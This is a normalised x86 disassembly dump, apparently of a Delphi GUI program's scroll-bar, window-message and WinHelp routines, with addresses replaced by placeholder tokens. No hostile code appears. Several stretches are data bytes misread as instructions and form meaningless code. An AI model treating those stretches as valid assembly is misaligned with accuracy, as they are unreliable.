test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call SendMessageA
push ebp
call sub_42e054
pop ecx
mov eax [ ebp - 0x4 ]
call sub_43469c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_4032f4
sub_42e19c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_42d974
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_438048
mov eax ebx
mov si 0xffc8
call sub_4032f4
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_42e1f3
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5fb5173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_43b290
push eax
call SendMessageA
pop ebx
retn
sub_42e228
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42e29d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_434a90
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44b6ac
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_43a714
mov eax ebx
mov si 0xffb8
call sub_4032f4
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e2a4
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_42e2ac
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_4032f4
jmp r-xdata
pop esi
retn
sub_42e2dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_436fbc
mov edx 0x79
mov eax esi
call sub_43424c
push 0x3
call GetSystemMetrics
mov edx eax
mov eax esi
call sub_434270
mov dl 0x1
mov eax esi
call sub_43b4c4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x208 ] 0x0
xor eax eax
mov [ esi + 0x20c ] eax
xor eax eax
mov [ esi + 0x210 ] eax
mov [ esi + 0x214 ] 0x64
mov [ esi + 0x220 ] 0x1
mov [ esi + 0x222 ] 0x1
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_42e394
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_43811c
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_438048
xor eax eax
mov al [ ebx + 0x208 ]
mov eax [ eax * 4 + rw-data ]
or [ edi + 0x4 ] eax
cmp [ ebx + 0x208 ] 0x1
jne r-xdata
mov eax ebx
call sub_42e4d4
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_4032f4
test al al
jne r-xdata
mov [ ebx + 0x21c ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
jmp r-xdata
or [ edi + 0x4 ] 0x2
or [ edi + 0x4 ] 0x4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42e424
call sub_434430
mov eax ebx
call sub_438248
lea edx [ esp + 0x1c ]
mov eax ebx
call sub_434450
push 0x0
mov eax [ ebx + 0x214 ]
push eax
mov eax [ ebx + 0x210 ]
push eax
push 0x2
mov eax ebx
call sub_43b290
push eax
call SetScrollRange
mov [ esp ] 0x1c
mov eax [ ebx + 0x218 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x4 ] 0x2
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_43b290
push eax
call SetScrollInfo
mov eax ebx
call sub_42e4d4
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_43b290
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_43b290
push eax
call SetScrollPos
jmp r-xdata
add esp 0x2c
pop ebx
retn
sub_42e4d4
push ebx
mov ebx eax
mov eax ebx
call sub_4350d4
test al al
je r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx + 0x208 ] 0x1
je r-xdata
xor eax eax
pop ebx
retn
sub_42e4f4
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] dl
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
call sub_438830
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
sub_42e530
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_42e667
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebp - 0x4 ]
jl r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
cmp esi [ ebx + 0x218 ]
jge r-xdata
cmp esi edi
jge r-xdata
mov edi [ ebp - 0x4 ]
cmp edi [ ebp - 0x4 ]
jge r-xdata
mov eax [ ebx + 0x210 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edi esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x210 ] eax
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_43b594
test al al
je r-xdata
cmp esi [ ebx + 0x214 ]
je r-xdata
cmp edi [ ebx + 0x20c ]
je r-xdata
cmp edi [ ebx + 0x20c ]
sete al
neg al
sbb eax eax
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_43b290
push eax
call SetScrollRange
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e66e
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
mov [ ebx + 0x20c ] edi
mov eax ebx
call sub_43b594
test al al
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
mov si 0xffb3
call sub_4032f4
mov eax ebx
call sub_42e4d4
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_43b290
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_43b290
push eax
call SetScrollPos
jmp r-xdata
sub_42e68c
push ebx
add esp 0xffffffe4
mov ebx eax
cmp edx [ ebx + 0x218 ]
je r-xdata
add esp 0x1c
pop ebx
retn
cmp edx [ ebx + 0x214 ]
jg r-xdata
mov [ ebx + 0x218 ] edx
mov [ esp ] 0x1c
mov [ esp + 0x10 ] edx
mov [ esp + 0x4 ] 0x2
mov eax ebx
call sub_43b594
test al al
je r-xdata
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_43b290
push eax
call SetScrollInfo
sub_42e754
push ebx
push esi
push edi
add esp 0xffffffe0
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20c ]
xor eax eax
mov al [ edi + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebx + 0x210 ]
cmp esi eax
jge r-xdata
jmp [ eax * 4 + jump_table_42e779 ]
mov eax [ ebx + 0x214 ]
cmp esi eax
jle r-xdata
mov esi eax
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
mov [ esp + 0x4 ] 0x1c
mov [ esp + 0x8 ] 0x17
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_43b290
push eax
call GetScrollInfo
mov esi [ esp + 0x1c ]
mov eax ebx
call sub_42e4d4
test al al
jne r-xdata
mov esi [ ebx + 0x210 ]
jmp r-xdata
mov esi [ ebx + 0x214 ]
mov [ esp ] esi
mov ecx esp
mov dl [ edi + 0x4 ]
mov eax ebx
mov si 0xffb2
call sub_4032f4
mov edx [ esp ]
mov eax ebx
call sub_42e678
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov esi eax
mov eax [ ebx + 0x214 ]
sub eax esi
mov esi eax
jmp r-xdata
sub_42e87c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_43b290
push eax
mov eax [ ebx + 0x174 ]
push eax
call CallWindowProcA
pop esi
pop ebx
retn
sub_42e8ac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e8d1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e8d8
retn
sub_42e8e8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
jmp r-xdata
sub al 0xa1
inc ecx
add [ eax - 0x4bffbe5a ] cl
or [ eax + eax + 0x10 ] al
adc al 0x44
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add al bl
jmp 0xffffffffa78ae9a4
sub_42e9d8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440ea0
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_42ea14
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ea39
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ea40
retn
sub_42ebd1
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
sub al 0x35
inc edx
add [ eax + eax ] bl
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42ecad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403eb4
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403f4c
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ecb4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed8
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404234
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_42ebf8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42ecad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403eb4
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403f4c
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ecb4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed8
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404234
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_42ecc8
push ebx
mov ebx eax
mov eax ebx
call sub_42eff8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_4054f0
sub_42ed04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42ed6b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_42ebf8
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ed72
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_42ed7c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42ee04
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_42ecf0
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404234
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ee0b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed8
retn
sub_42ee17
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42ee9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_42f53c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eea6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed8
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_42ebf8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404374
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42ee24
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42ee9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_42f53c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eea6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed8
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_42ebf8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404374
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42eeac
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42efa4
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_42ebf8
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408aac
mov eax ebx
call sub_42f53c
test al al
je r-xdata
mov ecx sub_42ea4c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42efab
lea eax [ ebp - 0x1c ]
call sub_403eb4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed8
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_42ebf8
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_42f494
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403f08
mov eax [ ebp - 0x4 ]
call sub_404374
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_404374
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42f014
push ebx
mov ebx eax
mov eax ebx
call sub_42eff8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_4054f0
pop ebx
retn
mov eax rw-data
call sub_4054f0
sub_42f044
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42f09c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f0a3
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_42ebf8
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_42f0ac
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42f1a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408a6c
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_42ebf8
mov eax ebx
call sub_42f53c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f1a9
lea eax [ ebp - 0x110 ]
call sub_403eb4
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404124
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_42f494
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404124
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_404374
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42f1c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42f222
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f229
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_42ebf8
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_42f234
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42f2b4
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42ebf8
mov eax ebx
call sub_42f53c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f2bb
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_42f494
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_404374
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42f2c4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_42f3af
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_42f53c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f3b6
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403ed8
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_407de8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_42f494
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_407de8
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403f08
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_42ebf8
mov eax [ ebp - 0x14 ]
call sub_404374
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_42f3c4
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4084d0
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_42f41f
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4084ac
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_42f494
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404364
xor eax eax
push ebp
push sub_42f50a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_42f478
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f511
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407a10
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_42f520
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_42f53c
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_42f478
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_42f51c
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_42f520
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_42f598
sub_42f598
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_42f615
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_42eff8
call GetTickCount
mov ebx eax
push 0x0
call sub_406034
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_42ebf8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f61c
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_404374
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42f624
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030c8
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
